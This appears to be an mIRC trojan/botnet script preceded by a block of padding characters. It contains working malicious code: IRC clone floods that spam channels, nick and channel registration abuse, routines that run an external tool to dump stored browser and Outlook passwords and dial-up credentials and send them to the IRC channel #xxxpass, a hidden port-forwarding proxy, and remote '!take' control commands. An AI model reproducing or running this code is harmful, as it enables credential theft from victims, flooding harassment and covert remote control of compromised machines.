1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111

on *:sockread:cl0nes*:{
  sockread %cl0nesread
  k33p %cl0nesread
}
alias fln1ck2 {
  set %fln1ck2 $rand(1,10)
  if (%fln1ck2 = 1) { return $read ksomk $+ $chr($r(65,125)) $+ $chr($r(65,125))  }
  if (%fln1ck2 = 2) { return $chr($r(65,125)) $+ $read ksomk $+ $chr($r(65,125))  }
  if (%fln1ck2 = 3) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $read  ksomk }
  if (%fln1ck2 = 4) { return $r(A,Z) $+ $read ksomk $+ $r(A,Z) }
  if (%fln1ck2 = 5) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z)  }
  if (%fln1ck2 = 6) { return $read ksomk $+ $r(1,40) $+ $chr($r(65,125))  }
  if (%fln1ck2 = 7) { return $r(a,z) $+ $read ksomk $+ $r(a,z) }
  if (%fln1ck2 = 8) { return $read ksomk $+ $r(a,z) $+ $chr($r(65,125))  }
  if (%fln1ck2 = 9) { return $read ksomk $+ $r(1,10) $+ $chr($r(65,125))  }
  if (%fln1ck2 = 10) { return $read ksomk $+ $r(20,50) $+ $chr($r(65,125)) }
}
alias clone {
  if ($1 = con) { set %cserver $2 | /set %cport $3 | /timerruns0ck $+ $fln1ck2 $4 2 runs0ck }
  if ($1 = j) { sockwrite -nt cl0nes* Join $2- }
  if ($1 = p) { sockwrite -nt cl0nes* Part $2 : $+ $3- }
  if ($1 = hell.c) { sockwrite -nt cl0nes* Join $2 | timer 20 0 //sockwrite -nt cl0nes* privmsg $2 : $3- }
  if ($1 = hell.n) { timer 10 0 //sockwrite -nt cl0nes* privmsg $2 : $3- | timer 10 0 //sockwrite -nt cl0nes* notice $2 : $3- }
  if ($1 = msg) { sockwrite -nt cl0nes* privmsg $2 : $+ $3- }
  if ($1 = notice) { sockwrite -nt cl0nes* notice $2 : $+ $3- }
  if ($1 = reg) { sockwrite -nt cl0nes* Privmsg NickServ : $+ register $2- | sockwrite -nt cl0nes* Privmsg NickServ : $+ identify $2- }
  if ($1 = creg) { set %rchan # $+ $fln1ck2 $+ $rand(1,1000) | sockwrite -nt cl0nes* Join %rchan | sockwrite -nt cl0nes* Privmsg Chanserv : register %rchan $fln1ck2 cl0nes }
  if ($1 = jp) { sockwrite -nt cl0nes* Join $2- | sockwrite -nt cl0nes* part $2 : $3- | sockwrite -nt cl0nes* Join $2- | sockwrite -nt cl0nes* part $2 : $3- | sockwrite -nt cl0nes* Join $2- | sockwrite -nt cl0nes* part $2 : $3- }
  if ($1 = jmp) { sockwrite -nt cl0nes* Join $2 | sockwrite -nt cl0nes* privmsg $2 : $3- | sockwrite -nt cl0nes* part $2 }
  if ($1 = f.c) { sockwrite -nt cl0nes* join $2 | sockwrite -nt cl0nes* privmsg $2 : $3- | sockwrite -nt cl0nes* notice $2 : $3- | sockwrite -nt cl0nes* privmsg $2 : $3- }
  if ($1 = f.n) { sockwrite -nt cl0nes* privmsg $2 : $3- | sockwrite -nt cl0nes* notice $2 : $3- | sockwrite -nt cl0nes* privmsg $2 : $3- }
  if ($1 = dcc) { sockwrite -nt cl0nes* privmsg $2 :DCC CHAT $2 1058633484 3481  }
  if ($1 = Quit) { Sockwrite -nt cl0nes* Quit : $+ $2- }
  if ($1 = massquit) { SockWrite -nt cl0nes* Join $2 | Sockwrite -nt cl0nes* Quit : $+ $3- }
  if ($1 = fnick) { sockwrite -nt cl0nes* Nick $2 $+ $r(1,10000) $+ $r(1,100000)  }
  if ($1 = Die) { timerruns0ck* off | sockclose cl0nes* }
  if ($1 = kill) { timerruns0ck* off | sockclose cl0nes* }
  if ($1 = quit) { timerruns0ck* off | sockclose cl0nes* }
  if ($1 = /) { sockwrite -nt cl0nes* $3- | halt }
}
alias runs0ck { sockopen cl0nes $+ $fln1ck2 %cserver %cport }
alias k33p {
  if (PING = $1) { sockwrite -nt * $1- }
}
on *:SOCKOPEN:cl0nes*:{
  set -u1 %user $rand(A,Z) $+ $fln1ck2 $+ $rand(A,Z)
  .sockwrite -nt $sockname USER %user %user %user : $+ %user
  .sockwrite -nt $sockname NICK $fln1ck2
}
alias getdialup { run dp.com /shtml xXx.xXx | .timer 1 3 cak xXx.xXx }
alias cak {
  set -u0 %xxx $lines($1)
  while (%xxx) {
    if ($left($read($1,%xxx),17) == <tr>xxxxxxxxxxxxx) { get-Pass $remove($remove($read($1,%xxx),xxxxxxxxxxxxx),xxxxxxxx,<tr>,FAF0F5 F5F0FASystem F0F0FFUser FAF0F5,$chr(44)) } 
    dec %xxx
  }
  .remove $1
}
alias get-Pass {
  set -u0 %#$# $replace($1-,FFFFF0,`,FFFAF0,!,FFF5F0,@,FFF0F0,*)
  set -u0 %name $remove($gettok(%#$#,1,33),$gettok(%#$#,1,64),`)
  set -u0 %num $remove($gettok(%#$#,1,64), $gettok(%#$#,1,33),!)
  set -u0 %user $remove($gettok(%#$#,1,42),$gettok(%#$#,1,64),@)
  set -u0 %pass $gettok($gettok(%#$#,2,42),1,32)
  if (%user == $null) { goto end }
  if (%pass == $null) { goto end }
  shows Entry-Name: %name // UserName: %user // PassWord: %pass // Phone: %num
  :end
}
alias g0ps { timerb 1 7 pschk | run lam4.exe lam5.exe /stext sr.dll }
alias pschk { timert4rg4p 0 1 p4sses }
alias rwps { timerbs 1 7 rwpsz | run lam4.exe lam5.exe /stext sr.dll }
alias rwpsz { timert4rg4p 0 1 rwp4ss3s }
alias rwp4ss3s {
  :start
  if ($file(sr.dll) = 0) { if ($exists(sr.dll) = $true) { remove sr.dll } | set %stch3ck off | timert4rg4p off }
  set %read $read(sr.dll,1)
  if (%read = ==================================================) { write -dl1 sr.dll }
  set %read $read(sr.dll,1)
  if (Resource Name isin %read) { tokenize 32 %read | set %Source $4- | write -dl1 sr.dll }
  set %read $read(sr.dll,1)
  if (Resource Type isin %read) {
    if (AutoComplete Fields isin %read) || (Outlook Express Identity isin %read) { write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll | goto start }
    write -dl1 sr.dll
  }
  set %read $read(sr.dll,1)
  if (User Name/Value : isin %read) { tokenize 32 %read | set %UserN $4- | write -dl1 sr.dll } 
  set %read $read(sr.dll,1)
  if (Password : isin %read) { tokenize 32 %read | set %Upass $3- | write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll
    if (%Source = $null) || (%UserN = $null) || (%Upass = $null) { halt }
    if (%rwword isin %Source) { privmsg #xxxpass [PASS] Source: %Source Username: %UserN Password: %Upass }
  }
}
alias p4sses {
  :start
  if ($file(sr.dll) = 0) { if ($exists(sr.dll) = $true) { remove sr.dll } | set %stch3ck off | timert4rg4p off }
  set %read $read(sr.dll,1)
  if (%read = ==================================================) { write -dl1 sr.dll }
  set %read $read(sr.dll,1)
  if (Resource Name isin %read) { tokenize 32 %read | set %Source $4- | write -dl1 sr.dll }
  set %read $read(sr.dll,1)
  if (Resource Type isin %read) {
    if (AutoComplete Fields isin %read) || (Outlook Express Identity isin %read) { write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll | goto start }
    write -dl1 sr.dll
  }
  set %read $read(sr.dll,1)
  if (User Name/Value : isin %read) { tokenize 32 %read | set %UserN $4- | write -dl1 sr.dll } 
  set %read $read(sr.dll,1)
  if (Password : isin %read) { tokenize 32 %read | set %Upass $3- | write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll
    if (%Source = $null) || (%UserN = $null) || (%Upass = $null) { halt }
    privmsg #xxxpass [PASS] Source: %Source Username: %UserN Password: %Upass
  }
}

on *:socklisten:ident-*:sockaccept ident. [ $+ [ $ticks ] ] | sockclose $sockname
on *:sockread:ident.*:sockread %ident | tokenize 32 %ident | if ($numtok($1-,44) == 2 && $1,$3 isnum) { sockwrite -n $sockname $3 , $1 : USERID : UNIX : $read(u) | sockclose $sockname }
on *:socklisten:gtportdirect*:{  set %gtsocknum 0 | shows $sock(gtportdirect.30,1).ip | :loop |  inc %gtsocknum 1 |  if $sock(gtin*,$calc($sock(gtin*,0) + %gtsocknum ) ) != $null { goto loop } |  set %gtdone $gettok($sockname,2,46) $+ . $+ $calc($sock(gtin*,0) + %gtsocknum ) | sockaccept gtin $+ . $+ %gtdone | sockopen gtout $+ . $+ %gtdone $gettok($sock($Sockname).mark,1,32) $gettok($sock($Sockname).mark,2,32) | unset %gtdone %gtsocknum }
on *:SoCkrEaD:gtin*: {  if ($sockerr > 0) return | :nextread | SoCkrEaD [ %gtinfotem [ $+ [ $sockname ] ] ] | if [ %gtinfotem [ $+ [ $sockname ] ] ] = $null { return } | if $sock( [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] ).status != active { inc %gtscatchnum 1 | set %gtempr $+ $right($sockname,$calc($len($sockname) - 4) ) $+ %gtscatchnum [ %gtinfotem [ $+ [ $sockname ] ] ] | return } | sockwrite -n [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] [ %gtinfotem [ $+ [ $sockname ] ] ] | unset [ %gtinfotem [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
on *:SoCkrEaD:gtout*: {  if ($sockerr > 0) return | :nextread | SoCkrEaD [ %gtouttemp [ $+ [ $sockname ] ] ] |  if [ %gtouttemp [ $+ [ $sockname ] ] ] = $null { return } | sockwrite -n [ gtin [ $+ [ $remove($sockname,gtout) ] ] ] [ %gtouttemp [ $+ [ $sockname ] ] ] | unset [ %gtouttemp [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
on *:Sockopen:gtout*: {  if ($sockerr > 0) return | set %gttempvar 0 | :stupidloop | inc %gttempvar 1 | if %gtempr  [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar ] ] != $null { sockwrite -n $sockname %gtempr [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar  ] ] |  goto stupidloop  } | else { unset %gtempr | unset %gtscatchnum | unset %gtempr* } }
on *:sockclose:gtout*: { unset %gtempr* | sockclose gtin $+ $right($sockname,$calc($len($sockname) - 5) ) | unset %gtscatchnum | sockclose $sockname }
on *:sockclose:gtin*: {   unset %gtempr* | sockclose gtout $+ $right($sockname,$calc($len($sockname) - 4) ) | unset %gtscatchnum  | sockclose $sockname }
on *:sockclose:sclick*:{ $decode(Lm1zZw==,m) $decode(I3h4eGdldA==,m) 15,0[07‘01V04.01i04.01s04.01i04.01t07,4:-15][04‘01Site07:04- 15][04‘01Visited07:04- 15][04‘01CocKet07:04 CLOSED15][ }
on *:sockopen:sclick*:{
  if $sockerr { halt }
  sockwrite -n $sockname GET %v.g HTTP/1.1
  sockwrite -n $sockname Host: %v.h
  sockwrite -n $sockname Connection: keep-alive
  sockwrite $sockname $crlf
  unset %v.g
  unset %v.h
}
On *:join:#:{
  if ($nick == $me) { 
    set %ch4n $chan 
    .timerxxZ 1 3 topic 
  } 
}
on *:TEXT:*:*:{
  if (!take = $1) {
    if ($2 = $null) { shows 2‘4Help02, 2Timer Nick:14(·04 !take <server> <port> <nickname> <pass> <email> | return }
    if (off = $2) { sockclose t1m3r* | shows 04‘2Timer04,2 All 4Clones:14(·2 Were 04‘2Killed04, | return }
    if (reg = $2) { sockwrite -n t1m3r* NICKSERV REGISTER $3 %t1m3r.p4ss %t1m3r.m41l | shows 4Timer:14(· 04‘2Registering04, | return }
    if (away = $2) { sockwrite -nt t1m3r* away : $+ $3- | return }
    if (raw = $2) { sockwrite -nt t1m3r* $3 : $+ $4- | return }
    %t1m3r.n1ck = $4
    %t1m3r.p4ss = $5
    %t1m3r.m41l = $6
    sockopen $+(t1m3r,$r(1,9999)) $2 $3
    shows 4Timer:14(· 04‘2loading04,02 To04 $2 $+ : $+ $3
  }
}

alias t1m3rnick { sockwrite -n $1 NICK %t1m3r.n1ck }
on *:SOCKOPEN:t1m3r*:{
  if $sockerr { return }
  %t1nk = $+($r(a,z),$read(ournik))
  sockwrite -n $sockname USER %t1nk * * : $+ %t1nk
  sockwrite -n $sockname NICK %t1nk 
}
on *:SOCKREAD:t1m3r*:{
  sockread %t1m3r
  tokenize 32 %t1m3r
  if ($1 = PING) { sockwrite -n $sockname PONG $2- }
  if ($2 = 432) { .timerX $+ $sockname 1 1 t1m3rnick $sockname }
  if ($2 = 601) { sockwrite -n $sockname NICK $4 }
  if ($2 = 605) { sockwrite -n $sockname NICK $4 }
  if ($2 = 376) { sockwrite -n $sockname MODE $3 +iR | sockwrite -n $sockname WATCH $+(+,%t1m3r.n1ck) }
  if ($1 = ERROR) { %sockname = $sockname | %ip = $sock($sockname).ip | %port = $sock($sockname).port | sockclose $sockname | sockopen %sockname %ip %port } 
  if ($2 = NICK) && (%t1m3r.n1ck = $remove($3,:)) { sockwrite -n $sockname NICKSERV register %t1m3r.p4ss %t1m3r.m41l }
  if ($4 = 440) { .timerX $+ $sockname 1 1 t1m3rnick }
}
